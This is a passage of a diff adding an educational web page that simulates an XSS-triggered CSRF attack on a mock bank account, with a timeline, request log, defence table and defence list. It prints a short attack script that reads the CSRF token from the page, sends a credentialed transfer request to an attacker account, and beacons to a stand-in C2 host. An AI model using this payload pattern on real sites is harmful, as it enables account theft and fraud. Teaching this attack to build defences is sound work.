+            &nbsp;&nbsp;<span class="pk">body:</span> JSON.stringify({<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="pk">to:</span> <span class="ps">'HACKER_ACC_9911'</span>,<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="pk">amount:</span> <span class="pv" id="payload-amount">50000</span>,<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="pk">note:</span> <span class="ps">'auto-transfer'</span><br>
+            &nbsp;&nbsp;})<br>
+            <span class="ph">});</span>
+          </div>
+          <div class="amount-input-row">
+            <label>// Transfer amount (₹):</label>
+            <input type="number" id="attack-amount" value="50000" min="1000" max="124500" step="1000" oninput="updatePayloadAmount(this.value)">
+          </div>
+          <button class="attack-btn" id="attack-btn" onclick="runAttack()">⚡ EXECUTE PAYLOAD</button>
+        </div>
+
+        <!-- Timeline -->
+        <div class="attack-timeline">
+          <div class="tl-title">// ATTACK TIMELINE</div>
+          <div class="tl-step"><div class="tl-num done" id="tl1">✓</div><div class="tl-text done" id="tl1-text">XSS payload injected via malicious ad / vulnerable comment field</div></div>
+          <div class="tl-step"><div class="tl-num done" id="tl2">✓</div><div class="tl-text done" id="tl2-text">CSRF token read from DOM: <span id="tl-csrf" style="color:#f9e2af">reading...</span></div></div>
+          <div class="tl-step"><div class="tl-num" id="tl3">3</div><div class="tl-text" id="tl3-text">Waiting — fetch('/api/transfer') not yet sent</div></div>
+          <div class="tl-step"><div class="tl-num" id="tl4">4</div><div class="tl-text" id="tl4-text">Waiting — browser attaches session cookies automatically</div></div>
+          <div class="tl-step"><div class="tl-num" id="tl5">5</div><div class="tl-text" id="tl5-text">Waiting — server validates &amp; processes transfer</div></div>
+          <div class="tl-step"><div class="tl-num" id="tl6">6</div><div class="tl-text" id="tl6-text">Waiting — funds transferred to hacker account</div></div>
+        </div>
+
+        <!-- Request log -->
+        <div class="req-log">
+          <div class="req-log-title">// NETWORK REQUESTS (browser devtools)</div>
+          <div id="log-container">
+            <div class="log-entry">
+              <div class="log-entry-head">
+                <span><span class="log-method get">GET</span> <span class="log-url">/dashboard</span></span>
+                <span class="log-status ok">200 OK</span>
+              </div>
+              <div class="log-body">
+                <span class="lk">Set-Cookie:</span> <span class="lv ok">session_id=<span id="cookie-in-log">...</span>; HttpOnly=false</span><br>
+                <span class="log-comment">// Victim loaded dashboard — session established</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PHASE 2 – REVEAL ═══ -->
+<div id="reveal-panel">
+<!-- ================= DYNAMIC CYBER BACKGROUND ================= -->
+<div class="cyber-bg" aria-hidden="true">
+  <div class="cyber-orb orb-1"></div>
+  <div class="cyber-orb orb-2"></div>
+  <div class="cyber-orb orb-3"></div>
+  <div class="cyber-orb orb-4"></div>
+  <div class="cyber-grid"></div>
+  <div class="cyber-scanline"></div>
+  <div class="cyber-particle p-1"></div>
+  <div class="cyber-particle p-2"></div>
+  <div class="cyber-particle p-3"></div>
+  <div class="cyber-particle p-4"></div>
+  <div class="cyber-particle p-5"></div>
+  <div class="cyber-particle p-6"></div>
+  <div class="cyber-particle p-7"></div>
+  <div class="cyber-particle p-8"></div>
+</div>
+
+
+  <div class="reveal-inner">
+    <div class="badge">⚠ TRANSFER EXECUTED — NO PASSWORD NEEDED</div>
+    <h2 style="margin-top:16px">₹<span id="r-amount">—</span> transferred without Om's knowledge.</h2>
+    <div class="sub">Attacker used Om's own browser, cookies, and CSRF token — as if Om did it himself.</div>
+
+    <div class="captured-box">
+      <h3>📡 ATTACK SUMMARY</h3>
+      <div class="kv"><span class="k">Victim:</span><span class="v">Om Bobde (om.bobde@gmail.com)</span></div>
+      <div class="kv"><span class="k">Account:</span><span class="v">XXXX-XXXX-4821</span></div>
+      <div class="kv"><span class="k">CSRF Token Used:</span><span class="v danger" id="r-csrf">—</span></div>
+      <div class="kv"><span class="k">Session Cookie:</span><span class="v danger" id="r-cookie">—</span></div>
+      <div class="kv"><span class="k">Amount Stolen:</span><span class="v danger">₹<span id="r-amt2">—</span></span></div>
+      <div class="kv"><span class="k">Transferred To:</span><span class="v danger">HACKER_ACC_9911</span></div>
+      <div class="kv"><span class="k">Server Saw Request As:</span><span class="v ok">Legitimate (valid session + CSRF token)</span></div>
+      <div class="kv"><span class="k">Password Required:</span><span class="v danger">None ✗</span></div>
+    </div>
+
+    <div class="section-title">🧬 The Full Attack Script</div>
+    <div class="code-block">
+<span class="c-gray">// === Injected via XSS — runs inside victim's browser ===</span>
+
+<span class="c-gray">// Step 1: Read CSRF token directly from the DOM</span>
+<span class="c-blue">const</span> <span class="c-yellow">csrfToken</span> = document
+  .<span class="c-purple">querySelector</span>(<span class="c-green">'input[name="csrf_token"]'</span>)?.value
+  || document.<span class="c-purple">querySelector</span>(<span class="c-green">'meta[name="csrf-token"]'</span>)?.content;
+
+<span class="c-gray">// Step 2: Make the transfer — same origin, cookies auto-attach</span>
+<span class="c-blue">await</span> fetch(<span class="c-red">'/api/transfer'</span>, {
+  method: <span class="c-green">'POST'</span>,
+  credentials: <span class="c-green">'include'</span>,   <span class="c-gray">// browser sends session cookie automatically</span>
+  headers: {
+    <span class="c-green">'Content-Type'</span>: <span class="c-green">'application/json'</span>,
+    <span class="c-amber">'X-CSRF-Token'</span>: csrfToken    <span class="c-gray">// defeats CSRF protection</span>
+  },
+  body: JSON.<span class="c-purple">stringify</span>({
+    to:     <span class="c-red">'HACKER_ACC_9911'</span>,
+    amount: <span class="c-yellow">50000</span>,
+    note:   <span class="c-green">'auto-transfer'</span>
+  })
+});
+
+<span class="c-gray">// Step 3: Silently notify attacker's C2 server</span>
+<span class="c-blue">new</span> Image().src = <span class="c-red">`https://evil-c2.net/done?amt=${amount}`</span>;
+    </div>
+
+    <div class="section-title">🔍 Why Classic CSRF Protection Fails Here</div>
+    <table class="vs-table">
+      <thead><tr><th>Defense</th><th>Works against Classic CSRF?</th><th>Works against XSS-CSRF?</th></tr></thead>
+      <tbody>
+        <tr><td>SameSite=Strict Cookie</td><td class="good">✓ Blocks cross-site</td><td class="bad">✗ Request is same-site (from same page)</td></tr>
+        <tr><td>CSRF Token (hidden input)</td><td class="good">✓ Attacker can't read it</td><td class="bad">✗ XSS script reads DOM directly</td></tr>
+        <tr><td>Referer Header Check</td><td class="good">✓ Cross-site shows wrong referer</td><td class="bad">✗ Referer is the real bank domain</td></tr>
+        <tr><td>HttpOnly Cookie</td><td class="good">✓ JS can't read cookie</td><td class="bad">✗ fetch() sends it automatically, no need to read</td></tr>
+      </tbody>
+    </table>
+
+    <div class="section-title">🔍 How This Attack Works</div>
+    <ul class="steps">
+      <li>
+        <h4>XSS delivers the payload</h4>
+        <p>Attacker finds an XSS vulnerability (stored comment, reflected param, malicious ad script). One line of injected JS is enough to start the attack.</p>
+      </li>
+      <li>
+        <h4>CSRF token read from DOM</h4>
+        <p>Since the payload runs on the same origin, it has full DOM access. It reads <code style="background:#1e1e2e;padding:1px 5px;border-radius:3px">input[name="csrf_token"]</code> — the same protection meant to stop CSRF attacks.</p>
+      </li>
+      <li>
+        <h4>fetch() with credentials:include</h4>
+        <p>The browser attaches the victim's session cookies to the request automatically. The server receives a perfectly valid, authenticated, CSRF-token-bearing request — indistinguishable from a real user action.</p>
+      </li>
+      <li>
+        <h4>Victim never notices</h4>
+        <p>No redirect. No popup. No UI change (until the balance drops). The whole attack takes milliseconds and leaves no obvious trace.</p>
+      </li>
+    </ul>
+
+    <div class="section-title">🛡 Real Defenses</div>
+    <div class="defenses">
+      <div class="def-card">
+        <div class="icon">🧱</div>
+        <h4>Fix XSS First</h4>
+        <p>This entire attack requires XSS as an entry point. Escaping output and using strict CSP headers eliminates the attack surface entirely.</p>
+      </div>
+      <div class="def-card">
+        <div class="icon">🔐</div>
+        <h4>Re-auth for Sensitive Actions</h4>
+        <p>Require password/OTP re-entry for transfers, email changes. Even with a valid session, the attacker can't supply the user's password.</p>
+      </div>
+      <div class="def-card">
+        <div class="icon">📍</div>
+        <h4>Double Submit + Origin Check</h4>
+        <p>Verify the <code>Origin</code> header server-side and require CSRF tokens to be sent in a custom header (not just form field) — harder for XSS to forge.</p>
+      </div>
+      <div class="def-card">
+        <div class="icon">⏱</div>
+        <h4>Anomaly Detection</h4>
+        <p>Flag transfers that happen within seconds of page load, or that differ from normal user behavior patterns — bot-like timing is a giveaway.</p>
+      </div>
+    </div>
+
+    <button class="btn-restart" onclick="restart()">↺ Phir Se Chalao</button>
+  </div>
+</div>
+
+<script>
+
+function animatePipeline(isAttack) {
+  const count = 5;
+  for (let i = 1; i <= count; i++) {
+    const el = document.getElementById('flow-step-' + i);
+    if (!el) continue;
+    el.className = "flow-step-item";
+    setTimeout(() => {
+      el.className = isAttack ? "flow-step-item attacked" : "flow-step-item active";
+    }, (i - 1) * 120);
+  }
+  const hb = document.getElementById('heartbeat-text');
+  if (hb) {
+    hb.textContent = isAttack ? "🚨 XSS-TRIGGERED CSRF: Admin account forged payload executed without consent!" : "Client Browser DOM Context · JavaScript Execution Sandbox";
+  }
+}
+
+  // ── Simulated server state ──
+  const CSRF_TOKEN   = 'csrf_' + Math.random().toString(36).slice(2, 18).toUpperCase();
+  const SESSION_ID   = 'sess_' + Math.random().toString(36).slice(2, 22);
+  let   balance      = 124500;
+  let   attackAmount = 50000;
+  let   attackRunning = false;
+
+  function startSim() {
+    document.getElementById('intro-banner').style.display = 'none';
+    document.getElementById('sim-wrapper').style.display  = 'flex';
+
+    // Populate tokens
+    document.getElementById('csrf-val').textContent     = CSRF_TOKEN;
+    document.getElementById('cookie-val').textContent   = SESSION_ID;
+    document.getElementById('cookie-in-log').textContent = SESSION_ID;
+    document.getElementById('tl-csrf').textContent      = CSRF_TOKEN;
+  }
+
+  function updatePayloadAmount(v) {
+    attackAmount = parseInt(v) || 50000;
+    document.getElementById('payload-amount').textContent = attackAmount;
+  }
+
+  function setTL(n, state, text) {
+    const num = document.getElementById('tl' + n);
+    const txt = document.getElementById('tl' + n + '-text');
+    if (!num) return;
+    if (state === 'done')   { num.className = 'tl-num done'; num.textContent = '✓'; if(txt){ txt.className='tl-text done'; txt.textContent=text; } }
+    if (state === 'active') { num.className = 'tl-num active'; num.textContent = n; if(txt){ txt.className='tl-text active'; txt.textContent=text; } }
+  }
+
+  function addLog(method, url, status, bodyLines, isOk) {
+    const c = document.getElementById('log-container');
+    const div = document.createElement('div');
+    div.className = 'log-entry';
+    div.style.borderColor = isOk ? '#1a3a1a' : '#7f1d1d';
+    div.innerHTML = `
+      <div class="log-entry-head">
+        <span><span class="log-method${method==='GET'?' get':''}">${method}</span> <span class="log-url">${url}</span></span>
+        <span class="log-status ${isOk?'ok':'pending'}">${status}</span>
+      </div>
+      <div class="log-body">${bodyLines}</div>
+    `;
+    c.appendChild(div);
+    div.scrollIntoView({ behavior: 'smooth' });
+  }
+
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+  async function runAttack() {
+    if (attackRunning) return;
+    attackRunning = true;
+    document.getElementById('attack-btn').disabled = true;
+
+    attackAmount = parseInt(document.getElementById('attack-amount').value) || 50000;
+    if (attackAmount > balance) { attackAmount = balance; }
+
+    // Step 3: fetch initiated
+    setTL(3, 'active', 'Sending fetch() to /api/transfer...');
+    addLog('POST', '/api/transfer', 'pending...', `
+      <span class="lk">X-CSRF-Token:</span> <span class="lv danger">${CSRF_TOKEN}</span><br>
+      <span class="lk">Cookie:</span> <span class="lv">session_id=${SESSION_ID} (auto-attached)</span><br>
+      <span class="lk">Body:</span> <span class="lv danger">{ to: "HACKER_ACC_9911", amount: ${attackAmount} }</span><br>
+      <span class="log-comment">// Request sent — browser attached cookies automatically</span>
+    `, false);
+    await sleep(900);
+
+    // Step 4: cookies attached
+    setTL(3, 'done', 'fetch() dispatched to /api/transfer');
+    setTL(4, 'active', 'Browser attaching session cookies to request...');
+    await sleep(700);
+
+    // Step 5: server validates
+    setTL(4, 'done', 'session_id=' + SESSION_ID + ' attached');
+    setTL(5, 'active', 'Server validating session + CSRF token...');
+    await sleep(900);
+
+    // Step 6: transfer happens
+    setTL(5, 'done', 'Server: session valid ✓  CSRF token valid ✓  Authorized!');
+    setTL(6, 'active', 'Processing transfer of ₹' + attackAmount.toLocaleString('en-IN') + '...');
+    await sleep(700);
+
+    // Update bank balance
+    balance -= attackAmount;
+    const balEl = document.getElementById('bank-balance');
+    balEl.textContent = '₹' + balance.toLocaleString('en-IN', {minimumFractionDigits:2});
+    balEl.classList.add('balance-flash');
+    document.getElementById('balance-sub').textContent = '⚠ Unauthorized Transfer Processed';
+    document.getElementById('balance-sub').style.color = '#dc2626';
+
+    // Show attacker txn in bank history
+    const now = new Date();
+    document.getElementById('attack-txn-time').textContent =
+      now.toLocaleTimeString('en-IN') + ' · 1 Sep 2026';
+    document.getElementById('attack-txn-amt').textContent = '−₹' + attackAmount.toLocaleString('en-IN');
+    document.getElementById('attack-txn').style.display = 'flex';
+
+    // Log response
+    addLog('POST', '/api/transfer', '200 OK', `
+      <span class="lk">Response:</span> <span class="lv ok">{ "status": "success", "txn_id": "TXN${Date.now()}" }</span><br>
+      <span class="log-comment">// Server accepted — CSRF token matched, session valid</span>
+    `, true);
+
+    // C2 beacon
+    addLog('GET', 'https://evil-c2.net/done?amt=' + attackAmount, '200 OK', `
+      <span class="log-comment">// Attacker notified via image beacon — stealth exfil</span>
+    `, false);
+
+    setTL(6, 'done', '₹' + attackAmount.toLocaleString('en-IN') + ' transferred to HACKER_ACC_9911 ✓');
+    await sleep(1200);
+
+    // Show reveal
+    document.getElementById('r-amount').textContent = attackAmount.toLocaleString('en-IN');
+    document.getElementById('r-csrf').textContent   = CSRF_TOKEN;
+    document.getElementById('r-cookie').textContent = SESSION_ID;
+    document.getElementById('r-amt2').textContent   = attackAmount.toLocaleString('en-IN');
+    document.getElementById('reveal-panel').style.display = 'block';
+  }
+
+  function restart() {
+    document.getElementById('reveal-panel').style.display = 'none';
+    document.getElementById('sim-wrapper').style.display  = 'none';
+    attackRunning = false;
+    balance = 124500;
+    document.getElementById('attack-btn').disabled = false;
+    document.getElementById('bank-balance').textContent = '₹1,24,500.00';
+    document.getElementById('bank-balance').classList.remove('balance-flash');
+    document.getElementById('balance-sub').textContent = 'Available Balance';
+    document.getElementById('balance-sub').style.color = '';
+    document.getElementById('attack-txn').style.display = 'none';
+    document.getElementById('attack-amount').value = 50000;
+    document.getElementById('payload-amount').textContent = 50000;
+    document.getElementById('log-container').innerHTML = `
+      <div class="log-entry">
+        <div class="log-entry-head">
+          <span><span class="log-method get">GET</span> <span class="log-url">/dashboard</span></span>
+          <span class="log-status ok">200 OK</span>
+        </div>
+        <div class="log-body">
+          <span class="lk">Set-Cookie:</span> <span class="lv ok">session_id=${SESSION_ID}; HttpOnly=false</span><br>
+          <span class="log-comment">// Victim loaded dashboard — session established</span>
+        </div>
+      </div>`;
+    // Reset tl1 & tl2 back to done state
+    const tl1 = document.getElementById('tl1'); if(tl1){ tl1.className='tl-num done'; tl1.textContent='✓'; }
+    const tl1t = document.getElementById('tl1-text'); if(tl1t){ tl1t.className='tl-text done'; tl1t.textContent='XSS payload injected via malicious ad / vulnerable comment field'; }
+    const tl2 = document.getElementById('tl2'); if(tl2){ tl2.className='tl-num done'; tl2.textContent='✓'; }
+    // tl2-text has a child span — restore safely
+    const tl2t = document.getElementById('tl2-text');
+    if(tl2t){ tl2t.className='tl-text done'; tl2t.innerHTML='CSRF token read from DOM: <span id="tl-csrf" style="color:#f9e2af">' + CSRF_TOKEN + '</span>'; }
+
+    // Reset tl3–tl6
+    const tlReset = [
+      ['tl3', 'Waiting — fetch(\'/api/transfer\') not yet sent'],
+      ['tl4', 'Waiting — browser attaches session cookies automatically'],
+      ['tl5', 'Waiting — server validates & processes transfer'],
+      ['tl6', 'Waiting — funds transferred to hacker account'],
+    ];
+    tlReset.forEach(([id, msg]) => {
+      const el = document.getElementById(id); if(el){ el.className='tl-num'; el.textContent=id.replace('tl',''); }
+      const tx = document.getElementById(id+'-text'); if(tx){ tx.className='tl-text'; tx.textContent=msg; }
+    });
+    document.getElementById('intro-banner').style.display = 'flex';
+  }
+</script>
+
+<footer class="modern-footer">
+  <div class="footer-badge">
+    <span class="footer-text">Designed and developed by <strong class="dev-name">Irshad Akaram</strong></span>
+  </div>
+</footer>
+
+</body>
+</html>
